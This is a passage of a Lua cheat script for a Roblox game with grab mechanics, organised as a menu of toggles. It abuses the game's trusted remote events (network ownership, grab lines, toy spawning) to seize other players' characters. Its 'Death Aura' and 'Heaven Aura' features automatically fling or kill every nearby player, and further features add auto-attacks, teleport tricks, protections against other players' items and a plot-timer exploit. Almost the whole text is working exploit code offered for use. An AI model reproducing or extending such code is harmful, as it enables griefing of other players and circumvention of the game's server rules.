    local Character = LP.Character or LP.CharacterAdded:Wait()
    local HRP = Character:WaitForChild("HumanoidRootPart")

    -- yeet the can very far away so it drops welds
    local skyCFrame = HRP.CFrame + Vector3.new(0, 1e20, 0)
    SpawnToyRemoteFunction:InvokeServer("SprayCanWD", skyCFrame, Vector3.new())

    task.wait(0.3)

    local ToysFolder = Workspace:WaitForChild(containerName)
    return ToysFolder:WaitForChild("SprayCanWD")
end

local function setupSprayCan(sprayCan)
    -- remove welds
    for _, part in ipairs(sprayCan:GetChildren()) do
        if part.Name == "StickyRemoverPart" then
            for _, weld in ipairs(part:GetChildren()) do
                if weld:IsA("WeldConstraint") then
                    weld:Destroy()
                end
            end
        end
    end

    -- collect sticky parts
    local stickyParts = {}
    for _, part in ipairs(sprayCan:GetChildren()) do
        if part.Name == "StickyRemoverPart" then
            table.insert(stickyParts, part)
        end
    end

    if #stickyParts == 0 then
        warn("No StickyRemoverPart found!")
        return
    end

    local Character = LP.Character
    if not Character then return end
    local HRP = Character:WaitForChild("HumanoidRootPart")

    -- follow behavior
    local function attachPart(part)
        part.Size = Vector3.new(5, 6, 5)
        part.Anchored = true
        part.CFrame = HRP.CFrame

        local conn = RunService.RenderStepped:Connect(function()
            if part and part.Parent then
                part.CFrame = HRP.CFrame
            end
        end)
        table.insert(activeConnections, conn)
    end

    for _, part in ipairs(stickyParts) do
        attachPart(part)
    end
end

-- === main toggle ===
local Toggle = Tab:CreateToggle({
    Name = "Anti Stick",
    CurrentValue = false,
    Flag = "AntiStick",

    Callback = function(Value)
        if Value then
            --//////////////////////////////////////////////////////////////////////////////
            --                    ENABLED
            --//////////////////////////////////////////////////////////////////////////////
            -- spawn initial toy
            local sprayCan = spawnSprayCan()
            setupSprayCan(sprayCan)

            -- monitor destruction: respawn exactly once per destruction
            sprayCan.AncestryChanged:Connect(function(_, parent)
                if not parent and Toggle.CurrentValue then
                    if not respawning then
                        respawning = true  -- lock
                        task.delay(0.1, function()
                            
                            -- ensure toggle still ON
                            if Toggle.CurrentValue then
                                local newCan = spawnSprayCan()
                                setupSprayCan(newCan)
                            end

                            respawning = false -- release
                        end)
                    end
                end
            end)

        else
            --//////////////////////////////////////////////////////////////////////////////
            --                    DISABLED
            --//////////////////////////////////////////////////////////////////////////////

            -- kill loops
            for _, conn in ipairs(activeConnections) do
                conn:Disconnect()
            end
            activeConnections = {}
            respawning = false

            -- destroy ONLY SprayCanWD
            local ToysFolder = Workspace:FindFirstChild(containerName)
            if ToysFolder then
                local sprayCan = ToysFolder:FindFirstChild("SprayCanWD")
                if sprayCan then
                    DestroyToy:FireServer(sprayCan)
                end
            end
        end
    end,
})
--//////////////////////////////////////////////////////////////////////////////
-- Anti-Paint
--//////////////////////////////////////////////////////////////////////////////
local AntiPaintEnabled = false
local loopConnection

Tab:CreateToggle({
    Name = "Anti-Paint",
    CurrentValue = false,
    Flag = "AntiPaintToggle",
    Callback = function(Value)
        AntiPaintEnabled = Value
        if loopConnection then loopConnection:Disconnect(); loopConnection = nil end
        if AntiPaintEnabled then
            loopConnection = RunService.Heartbeat:Connect(function()
                for _, obj in ipairs(Workspace:GetChildren()) do
                    if string.match(obj.Name, "SpawnedInToys$") then
                        for _, bucket in ipairs(obj:GetChildren()) do
                            if bucket.Name == "BucketPaint" then
                                for _, part in ipairs(bucket:GetChildren()) do
                                    if part.Name == "PaintPlayerPart" then
                                        part:Destroy()
                                    end
                                end
                            end
                        end
                    end
                end
            end)
        end
    end,
})

--//////////////////////////////////////////////////////////////////////////////
-- Other Players Protection & Auto-Attack
local Section = Tab:CreateSection("Protect Others")
--//////////////////////////////////////////////////////////////////////////////
local GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
local CreateGrabLine = GrabEvents:WaitForChild("CreateGrabLine")
local SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
local ExtendGrabLine = GrabEvents:WaitForChild("ExtendGrabLine")
local DestroyGrabLine = GrabEvents:FindFirstChild("DestroyGrabLine")

local MAX_REACH = 30
local LAUNCH_FORCE = 10000

local protectionEnabled = false
local protectedPlayers = {}
local whitelistedPlayers = {}
local autoAttackMode = "Nothing"

local ghostPos = nil
local camera = Workspace.CurrentCamera
local camFrozen = false
local storedCamCF = nil

local displayNameToPlayer = {}
local function getDisplayNames()
    displayNameToPlayer = {}
    local list = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            table.insert(list, plr.DisplayName)
            displayNameToPlayer[plr.DisplayName] = plr
        end
    end
    return list
end

-- Dropdowns and toggles
local WhitelistDropdown = Tab:CreateDropdown({
    Name = "Whitelist",
    Options = getDisplayNames(),
    CurrentOption = {},
    MultipleOptions = true,
    Flag = "WhitelistPlayers",
    Callback = function(options)
        whitelistedPlayers = {}
        for _, name in ipairs(options) do
            local plr = displayNameToPlayer[name]
            if plr then table.insert(whitelistedPlayers, plr) end
        end
    end,
})

local ProtectDropdown = Tab:CreateDropdown({
    Name = "Protected Players",
    Options = getDisplayNames(),
    CurrentOption = {},
    MultipleOptions = true,
    Flag = "ProtectedList",
    Callback = function(selected)
        protectedPlayers = {}
        for _, name in ipairs(selected) do
            local plr = displayNameToPlayer[name]
            if plr then table.insert(protectedPlayers, plr) end
        end
    end,
})

local ProtectToggle = Tab:CreateToggle({
    Name = "Protect Players",
    CurrentValue = false,
    Flag = "ProtectionEnabled",
    Callback = function(v) protectionEnabled = v end,
})

local AutoAttackDropdown = Tab:CreateDropdown({
    Name = "Auto Attack",
    Options = {"Nothing", "Kick", "Heaven"},
    MultipleOptions = false,
    CurrentOption = {"Nothing"},
    Flag = "AutoAttackMode",
    Callback = function(option) autoAttackMode = option[1] end,
})

-- Refresh dynamically
local function refreshDropdowns()
    ProtectDropdown:Refresh(getDisplayNames(), {})
    WhitelistDropdown:Refresh(getDisplayNames(), {})
end
Players.PlayerAdded:Connect(refreshDropdowns)
Players.PlayerRemoving:Connect(refreshDropdowns)

-- Ghost teleport helpers
local function freezeCamera()
    if camFrozen then return end
    camFrozen = true
    storedCamCF = camera.CFrame
    camera.CameraType = Enum.CameraType.Scriptable
    camera.CFrame = storedCamCF
end

local function restoreCamera()
    if not camFrozen then return end
    camFrozen = false
    camera.CameraType = Enum.CameraType.Custom
end

local function ghostTeleport(cf)
    local char = LocalPlayer.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    if not ghostPos then ghostPos = root.CFrame end
    freezeCamera()
    root.CFrame = cf
    task.defer(function() if storedCamCF then camera.CFrame = storedCamCF end end)
end

local function ghostRestoreSoon()
    task.delay(0.03, function()
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if root and ghostPos then root.CFrame = ghostPos end
        restoreCamera()
        ghostPos = nil
    end)
end

-- Helpers for grabbing and attacks
local function resolveAttacker(value)
    if typeof(value) == "Instance" and value:IsA("Player") then return value end
    if typeof(value) == "string" then return Players:FindFirstChild(value) end
    return nil
end

local function instantGrab(target)
    if not target.Character then return end
    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
    local head = target.Character:FindFirstChild("Head")
    if not hrp or not head then return end
    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not myRoot then return end
    local dist = (myRoot.Position - hrp.Position).Magnitude
    if dist <= MAX_REACH then
        pcall(function() CreateGrabLine:FireServer(hrp, myRoot.CFrame) end)
        pcall(function() DestroyGrabLine:FireServer(hrp) end)
        pcall(function() SetNetworkOwner:FireServer(hrp, myRoot.CFrame) end)
        pcall(function() ExtendGrabLine:FireServer(dist) end)
        return
    end
    ghostTeleport(hrp.CFrame * CFrame.new(0, -3, -2))
    task.wait()
    pcall(function() SetNetworkOwner:FireServer(hrp, hrp.CFrame) end)
    pcall(function() DestroyGrabLine:FireServer(hrp) end)
    ghostRestoreSoon()
end

local function Heaven(attacker)
    if not attacker.Character then return end
    local hrp = attacker.Character:FindFirstChild("HumanoidRootPart")
    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp or not myRoot then return end
    local distance = (hrp.Position - myRoot.Position).Magnitude
    if distance > MAX_REACH then return end
    pcall(function() CreateGrabLine:FireServer(hrp, myRoot.CFrame) end)
    if DestroyGrabLine then pcall(function() DestroyGrabLine:FireServer(hrp) end) end
    pcall(function() SetNetworkOwner:FireServer(hrp, myRoot.CFrame) end)
    pcall(function() ExtendGrabLine:FireServer(distance) end)
    local bv = Instance.new("BodyVelocity")
    bv.Name = "LaunchVelocity"
    bv.Velocity = Vector3.new(0, LAUNCH_FORCE, 0)
    bv.MaxForce = Vector3.new(0, math.huge, 0)
    bv.P = 1250
    bv.Parent = hrp
    Debris:AddItem(bv, 1)
end

local function Death(attacker)
    if not attacker.Character then return end
    local enemyRoot = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not enemyRoot then return end
    pcall(function()
        SetNetworkOwner:FireServer(enemyRoot, enemyRoot.CFrame)
        if DestroyGrabLine then DestroyGrabLine:FireServer(enemyRoot) end
    end)
    for _, part in ipairs(attacker.Character:GetChildren()) do
        if part:IsA("BasePart") then part.CFrame = CFrame.new(-1e9, 1e9, -1e9) end
    end
    local bv = Instance.new("BodyVelocity")
    bv.Velocity = Vector3.new(0, -9e17, 0)
    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    bv.P = 100000075
    bv.Parent = enemyRoot
    Debris:AddItem(bv, 1)
end

local function performAutoAttack(attacker)
    if autoAttackMode == "Nothing" then return end
    if autoAttackMode == "Heaven" then Heaven(attacker)
    elseif autoAttackMode == "Kick" then Death(attacker) end
end

-- Main protection loop
RunService.Heartbeat:Connect(function()
    if not protectionEnabled or #protectedPlayers == 0 then return end

    for _, protected in ipairs(protectedPlayers) do
        if not protected.Character then continue end
        local head = protected.Character:FindFirstChild("Head")
        if not head then continue end
        local ownerInst = head:FindFirstChild("PartOwner")
        if not ownerInst or not ownerInst.Value then continue end

        local attacker = resolveAttacker(ownerInst.Value)
        if not attacker or attacker == LocalPlayer then continue end

        -- Skip whitelisted attackers
        local skip = false
        for _, w in ipairs(whitelistedPlayers) do
            if attacker == w then skip = true break end
        end
        if skip then continue end

        instantGrab(protected)
        performAutoAttack(attacker)
    end
end)

--//////////////////////////////////////////////////////////////////////////////
--  AURA TAB
local Tab = Window:CreateTab("Aura", 0)
--//////////////////////////////////////////////////////////////////////////////
--  SERVICES
--//////////////////////////////////////////////////////////////////////////////

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace         = game:GetService("Workspace")
local RunService        = game:GetService("RunService")
local Debris            = game:GetService("Debris")

local localPlayer       = Players.LocalPlayer

--//////////////////////////////////////////////////////////////////////////////
--  GRAB EVENT REFERENCES
--//////////////////////////////////////////////////////////////////////////////

local grabEventsFolder  = ReplicatedStorage:WaitForChild("GrabEvents")
local CreateGrabLine    = grabEventsFolder:WaitForChild("CreateGrabLine")
local SetNetworkOwner   = grabEventsFolder:WaitForChild("SetNetworkOwner")
local ExtendGrabLine    = grabEventsFolder:WaitForChild("ExtendGrabLine")
local DestroyGrabLine   = grabEventsFolder:FindFirstChild("DestroyGrabLine")

--//////////////////////////////////////////////////////////////////////////////
--  HEAVEN AURA CONFIG
--//////////////////////////////////////////////////////////////////////////////

local MAX_REACH   = 30
local LAUNCH_FORCE = 10000
local auraEnabled  = false

Tab:CreateToggle({
    Name = "Heaven Aura",
    CurrentValue = false,
    Flag = "HeavenAura",
    Callback = function(Value)
        auraEnabled = Value
    end,
})

--//////////////////////////////////////////////////////////////////////////////
--  HEAVEN AURA LOGIC
--//////////////////////////////////////////////////////////////////////////////

local function grabAndLaunch(player)
    if not player.Character then return end

    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
    local myHRP = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp or not myHRP then return end

    local distance = (hrp.Position - myHRP.Position).Magnitude
    if distance > MAX_REACH then return end

    local offset = myHRP.CFrame

    -- Fire invisible grab line
    pcall(function() CreateGrabLine:FireServer(hrp, offset) end)
    if DestroyGrabLine then
        pcall(function() DestroyGrabLine:FireServer(hrp) end)
    end
    pcall(function() SetNetworkOwner:FireServer(hrp, offset) end)
    pcall(function() ExtendGrabLine:FireServer(distance) end)

    -- Launch upwards
    local existingVelocity = hrp:FindFirstChild("LaunchVelocity")
    if existingVelocity then existingVelocity:Destroy() end

    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Name = "LaunchVelocity"
    bodyVelocity.Velocity = Vector3.new(0, LAUNCH_FORCE, 0)
    bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
    bodyVelocity.P = 1250
    bodyVelocity.Parent = hrp

    Debris:AddItem(bodyVelocity, 1)
end

RunService.Heartbeat:Connect(function()
    if not auraEnabled then return end

    local myHRP = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not myHRP then return end

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= localPlayer then
            grabAndLaunch(plr)
        end
    end
end)

--//////////////////////////////////////////////////////////////////////////////
--  DEATH AURA CONFIG + SERVICES
--//////////////////////////////////////////////////////////////////////////////

local LocalPlayer  = localPlayer
local GrabEvents   = grabEventsFolder
local SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
local DestroyGrabLine = GrabEvents:WaitForChild("DestroyGrabLine")

if not LocalPlayer.Character then
    LocalPlayer.CharacterAdded:Wait()
end

local DeathAuraConnection = nil

--//////////////////////////////////////////////////////////////////////////////
--  DEATH AURA LOGIC
--//////////////////////////////////////////////////////////////////////////////

local function StartDeathAura()
    DeathAuraConnection = RunService.Heartbeat:Connect(function()
        local char = LocalPlayer.Character
        if not char then return end

        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end

        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character then
                local enemy = plr.Character
                local enemyRoot = enemy:FindFirstChild("HumanoidRootPart")
                local enemyHead = enemy:FindFirstChild("Head")
                local humanoid = enemy:FindFirstChildOfClass("Humanoid")

                if enemyRoot and enemyHead and humanoid and humanoid.Health > 0 then
                    if (enemyRoot.Position - root.Position).Magnitude <= 25 then

                        pcall(function()
                            SetNetworkOwner:FireServer(enemyRoot, enemyRoot.CFrame)
                            task.wait(0.1)

                            DestroyGrabLine:FireServer(enemyRoot)

                            if enemyHead:FindFirstChild("PartOwner")
                               and enemyHead.PartOwner.Value == LocalPlayer.Name then

                                -- yeet enemy parts into the sun (twice)
                                for _, part in ipairs(enemy:GetChildren()) do
                                    if part:IsA("BasePart") then
                                        part.CFrame = CFrame.new(-1e9, 1e9, -1e9)
                                    end
                                end
                                task.wait()
                                for _, part in ipairs(enemy:GetChildren()) do
                                    if part:IsA("BasePart") then
                                        part.CFrame = CFrame.new(-1e9, 1e9, -1e9)
                                    end
                                end

                                -- downward delete-beam
                                local bv = Instance.new("BodyVelocity")
                                bv.Velocity = Vector3.new(0, -9999999, 0)
                                bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
                                bv.P = 100000075
                                bv.Parent = enemyRoot

                                humanoid.Sit = false
                                humanoid.Jump = true
                                humanoid.BreakJointsOnDeath = false
                                humanoid:ChangeState(Enum.HumanoidStateType.Dead)

                                task.delay(2, function()
                                    if bv and bv.Parent then
                                        bv:Destroy()
                                    end
                                end)
                            end
                        end)
                    end
                end
            end
        end
    end)
end

local function StopDeathAura()
    if DeathAuraConnection then
        DeathAuraConnection:Disconnect()
        DeathAuraConnection = nil
    end
end

--//////////////////////////////////////////////////////////////////////////////
--  DEATH AURA TOGGLE
--//////////////////////////////////////////////////////////////////////////////

Tab:CreateToggle({
    Name = "Death Aura",
    CurrentValue = false,
    Flag = "DeathAuraFTAP",
    Callback = function(Value)
        if Value then
            StartDeathAura()
        else
            StopDeathAura()
        end
    end,
})

--//////////////////////////////////////////////////////////////////////////////
local Tab = Window:CreateTab("Player", 0)
--//////////////////////////////////////////////////////////////////////////////



--//////////////////////////////////////////////////////////////////////////////
-- 3rd Person
--//////////////////////////////////////////////////////////////////////////////

local Toggle = Tab:CreateToggle({ 
    Name = "3rd person",
    CurrentValue = false,
    Flag = "3rdPerson",
    Callback = function(Value)
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")

        local player = Players.LocalPlayer
        local cam = workspace.CurrentCamera

        -- hard-locked 3rd-person distance
        local THIRD_PERSON_DISTANCE = 12  -- <<< change this to whatever you want

        local FIRST_PERSON_THRESHOLD = 1
        local FADE_START = 2
        local FADE_END = 4

        local BODY_PART_NAMES = {
            "Head",
            "Torso",
            "Left Arm",
            "Right Arm",
            "Left Leg",
            "Right Leg",
        }

        local function getAccessoryParts(char)
            local parts = {}
            for _, accessory in ipairs(char:GetChildren()) do
                if accessory:IsA("Accessory") then
                    local h = accessory:FindFirstChild("Handle")
                    if h then table.insert(parts, h) end
                end
            end
            return parts
        end

        local function getAccessoryDescendants(char, name)
            local accessory = char:FindFirstChild(name)
            if not accessory then return {} end
            local parts = {}
            for _, d in ipairs(accessory:GetDescendants()) do
                if d:IsA("BasePart") then table.insert(parts, d) end
            end
            return parts
        end

        -- nuke old connection
        if _G.BodyFadeConnection then
            _G.BodyFadeConnection:Disconnect()
            _G.BodyFadeConnection = nil
        end

        if Value then
            -- Toggle ON: locked 3rd-person
            player.CameraMode = Enum.CameraMode.Classic

            -- LOCK the zoom so nobody can change it
            player.CameraMinZoomDistance = THIRD_PERSON_DISTANCE
            player.CameraMaxZoomDistance = THIRD_PERSON_DISTANCE

            _G.BodyFadeConnection = RunService.RenderStepped:Connect(function()
                local char = player.Character
                if not char then return end

                local head = char:FindFirstChild("Head")
                if not head then return end

                local dist = (cam.CFrame.Position - head.Position).Magnitude
                local alpha

                if dist <= FIRST_PERSON_THRESHOLD then
                    alpha = 1
                elseif dist <= FADE_END then
                    alpha = 1 - ((dist - FADE_START) / (FADE_END - FADE_START))
                    alpha = math.clamp(alpha, 0, 1)
                else
                    alpha = 0
                end

                for _, name in ipairs(BODY_PART_NAMES) do
                    local p = char:FindFirstChild(name)
                    if p then
                        p.LocalTransparencyModifier = alpha
                        p.Transparency = (alpha == 1) and 1 or 0
                    end
                end

                for _, h in ipairs(getAccessoryParts(char)) do
                    h.LocalTransparencyModifier = alpha
                    h.Transparency = (alpha == 1) and 1 or 0
                end

                for _, p in ipairs(getAccessoryDescendants(char, "TypingKeyboardMyWorld")) do
                    p.LocalTransparencyModifier = 1
                    p.Transparency = 1
                end
            end)
        else
            -- Toggle OFF: full first-person lock
            if player.Character then
                for _, name in ipairs(BODY_PART_NAMES) do
                    local p = player.Character:FindFirstChild(name)
                    if p then
                        p.LocalTransparencyModifier = 0
                        p.Transparency = 0
                    end
                end
            end

            player.CameraMinZoomDistance = 0
            player.CameraMaxZoomDistance = 0
            player.CameraMode = Enum.CameraMode.LockFirstPerson
        end
    end
})

--//////////////////////////////////////////////////////////////////////////////
local Tab = Window:CreateTab("Teleport", 0)
--//////////////////////////////////////////////////////////////////////////////

--//////////////////////////////////////////////////////////////////////////////
--  Inf Plot Time
--//////////////////////////////////////////////////////////////////////////////

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer

-- Persistent state so we can clean up later
local running = false
local connections = {}     -- store RBXScriptConnection objects
local monitored = {}       -- map of timeValue Instances we've already monitored
local debounce = {}        -- map used by the handler

local function safeDisconnect(conn)
    if not conn then return end
    pcall(function()
        -- RBXScriptConnection has :Disconnect()
        if conn.Disconnect then conn:Disconnect() end
    end)
end

local function cleanup()
    -- stop future handlers from doing work
    running = false

    -- disconnect all stored connections
    for _, conn in ipairs(connections) do
        safeDisconnect(conn)
    end

    -- clear tables
    connections = {}
    monitored = {}
    debounce = {}
end

local function teleportToAndBack(targetPart)
    if not running then return end
    if not targetPart or not targetPart:IsA("BasePart") then return end

    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChildWhichIsA("BasePart")
    if not hrp then return end

    local originalCFrame = hrp.CFrame
    pcall(function()
        hrp.CFrame = targetPart.CFrame + Vector3.new(0, 3, 0)
    end)

    task.wait(0.5)

    -- restore only if we are still allowed to do so (and still have the character)
    char = player.Character
    hrp = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChildWhichIsA("BasePart"))
    if hrp and originalCFrame then
        pcall(function()
            hrp.CFrame = originalCFrame
        end)
    end
end

local function monitorOwnerString(ownerString, plotSign)
    if not running then return end
    if not ownerString or not ownerString:IsA("StringValue") then return end
    if ownerString.Value ~= player.Name then return end

    local timeVal = ownerString:FindFirstChild("TimeRemainingNum")
    if not timeVal or not timeVal:IsA("IntValue") then return end
    if monitored[timeVal] then return end
    monitored[timeVal] = true

    local function handleTrigger()
        if not running then return end
        if debounce[timeVal] then return end
        debounce[timeVal] = true

        local targetPart = plotSign:FindFirstChildWhichIsA("BasePart") or plotSign.PrimaryPart
        if not targetPart then
            for _, d in ipairs(plotSign:GetDescendants()) do
                if d:IsA("BasePart") then
                    targetPart = d
                    break
                end
            end
        end

        if targetPart then
            teleportToAndBack(targetPart)
        end

        task.delay(0.5, function()
            debounce[timeVal] = nil
        end)
    end

    -- immediate trigger check
    if timeVal.Value == 1 then
        task.spawn(handleTrigger)
    end

    -- property changed connection
    local conn = timeVal:GetPropertyChangedSignal("Value"):Connect(function()
        if not running then return end
        if timeVal.Value == 1 then
            task.spawn(handleTrigger)
        end
    end)
    table.insert(connections, conn)
end

local function handlePlotModel(plotModel)
    if not running then return end
    local plotSign = plotModel:FindFirstChild("PlotSign")
    if not plotSign then return end

    local ownersFolder = plotSign:FindFirstChild("ThisPlotsOwners")
    if not ownersFolder then return end

    for _, entry in ipairs(ownersFolder:GetChildren()) do
        monitorOwnerString(entry, plotSign)
    end

    local conn = ownersFolder.ChildAdded:Connect(function(entry)
        task.wait(0.05)
        monitorOwnerString(entry, plotSign)
    end)
    table.insert(connections, conn)
end

local function start()
    if running then return end
    running = true

    -- ensure Plots exists
    local plots = Workspace:WaitForChild("Plots")
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") or plot:IsA("Folder") then
            handlePlotModel(plot)
        end
    end

    local plotsConn = plots.ChildAdded:Connect(function(plot)
        task.wait(0.05)
        if plot:IsA("Model") or plot:IsA("Folder") then
            handlePlotModel(plot)
        end
    end)
    table.insert(connections, plotsConn)
end

-- The toggle creation: call start() when toggled ON, cleanup() when toggled OFF
local Toggle = Tab:CreateToggle({
    Name = "Infinite plot time",
    CurrentValue = false,
    Flag = "TeleportPlotTime",
    Callback = function(Value)
        if Value then
            start()
        else
            cleanup()
        end
    end
})


